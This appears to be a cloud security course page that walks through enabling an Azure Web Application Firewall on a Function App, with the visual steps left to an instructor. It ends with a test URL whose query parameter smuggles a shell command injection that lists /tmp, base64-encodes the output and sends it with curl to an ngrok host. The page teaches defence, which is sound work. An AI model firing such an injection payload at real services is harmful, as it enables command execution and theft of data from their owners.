# Web Application Firewall

This part of the module is pretty graphical.

To save copying/pasting a ton of screenshots here, please follow along with the instructor for this part of the course. 


1. Function App in Portal
2. Settings
3. Network
4. Add WAF With FrontDoor
5. Navigate to WAF
   1. Turn on blocking
   2. Check rules
6. Test our malicious code command again

```bash
https://<FUNCTION_APP_NAME>.azurewebsites.net/api/slsSec?name=Sarah%20;%20echo%20%22Hello%22%20;%20curl%20<NGROK_DOMAIN>.ngrok.io?data=$(ls%20/tmp%20|%20base64%20--wrap=0)
```
